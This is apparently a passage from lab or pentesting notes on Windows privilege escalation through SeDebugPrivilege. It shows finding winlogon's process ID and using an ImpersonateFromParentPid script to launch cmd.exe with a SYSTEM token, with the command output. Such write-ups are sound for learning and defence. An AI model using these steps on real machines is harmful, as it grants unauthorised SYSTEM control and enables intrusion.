...
To run applications or a service or assist with general troubleshooting. a user might be assigned sedebugprivilege instead of adding the account into the administrators group. this privilege can be used to capture sensitive information from **system memory** or even access/modify kernel and application structures. 
...
We could also get remote code execution as system. We can elevate our privs to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behaviour to inherit the token of a parent process and impersonate it. if we target a parent process running already as SYSTEM (by specifying the Process ID or PID) then we can elevate our rights quickly
...
PS C:\users\jordan\desktop> tasklist /svc | findstr winlogon.exe
winlogon.exe                   612 N/A
winlogon.exe                  1296 N/A
```

now I have everythign I need, dont forget to use the **RUNAS ADMINISTRATOR** for the CMD or Powershell to actually be able to USE the permissions provided in this case being SeDebug

```
PS C:\users\jordan\desktop> . .\fuckoff.ps1
PS C:\users\jordan\desktop>  ImpersonateFromParentPid -ppid 612 -command cmd.exe -cmdargs whoami
[+] Got Handle for ppid: 612
[+] Updated proc attribute list
[+] Starting cmd.exe whoami...True - pid: 6788 - Last error: 2
```
